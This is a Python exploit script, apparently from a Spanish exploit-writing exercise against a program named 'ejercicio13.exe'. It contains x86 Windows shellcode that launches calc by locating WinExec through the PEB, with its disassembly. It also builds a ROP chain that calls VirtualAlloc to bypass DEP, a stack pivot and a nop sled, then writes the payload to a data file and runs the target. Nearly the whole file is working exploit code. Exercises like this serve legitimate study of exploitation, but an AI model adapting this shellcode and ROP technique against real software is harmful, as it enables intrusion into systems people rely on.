import struct,subprocess, win32api

p = lambda x : struct.pack("<I", x)

shellcode = "\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52"
shellcode += "\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E"
shellcode += "\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C"
shellcode += "\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F"
shellcode += "\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7\x90"




''' shellcode
.code
start:
	and    sp,0xfffc
	xor    edx,edx
	push   edx
	push   0x636c6163
	mov    esi,esp
	push   edx
	push   esi
	mov    esi,DWORD PTR fs:[edx+0x30]
	mov    esi,DWORD PTR [esi+0xc]
	mov    esi,DWORD PTR [esi+0xc]
	lods   eax,DWORD PTR ds:[esi]
	mov    esi,DWORD PTR [eax]
	mov    edi,DWORD PTR [esi+0x18]
	mov    ebx,DWORD PTR [edi+0x3c]
	mov    ebx,DWORD PTR [edi+ebx*1+0x78]
	mov    esi,DWORD PTR [edi+ebx*1+0x20]
	add    esi,edi
	mov    ecx,DWORD PTR [edi+ebx*1+0x24]
	add    ecx,edi

iter:
	inc    edx
	lods   eax,DWORD PTR ds:[esi]
	cmp    DWORD PTR [edi+eax*1],0x456e6957
	jne    iter
	movzx  edx,WORD PTR [ecx+edx*2-0x2]
	mov    esi,DWORD PTR [edi+ebx*1+0x1c]
	add    esi,edi
	add    edi,DWORD PTR [esi+edx*4]
	call   edi
	nop

'''

payload  = "\xff" + p(0x45464748) +  p(0xdeadbeef) + p(0xff) # bypassing checks

payload += p(0x1010179b) 		# pop esi              <---------------------=    
payload += p(0x10103000+0x74)	# virtualloc + 74h                           |
payload += p(0x10101b00)		# jump [esi + 74h]                           |
payload += p(0x1010103a)		# |	 ret									 |
payload += p(0x0012af80)		# |	 addr									 |
payload += p(0x00001000)		# |	 size									 |
payload += p(0x00001000)		# |	 allocation type						 |
payload += p(0x00000040)		# |- Protection								 |
payload += p(0x0012af8a)		# jmp to nop sled	----------------------=	 |
payload += p(0x10103000)		# virtualAlloc to be poped in shellcode   |	 |
payload += p(0xdeadbeef) * 10	# nop sled <------------------------------=   |
payload += p(0x10101CA3) 		# pop pop pop ret							 |
payload += p(0x10101039) 		# stack pivot pop ret -----------------------=		
payload += p(0x90909090) * 7
payload += shellcode 

fDat = open('fichero.dat', 'wb')
fDat.write(payload)
subprocess.Popen(['ejercicio13.exe'])
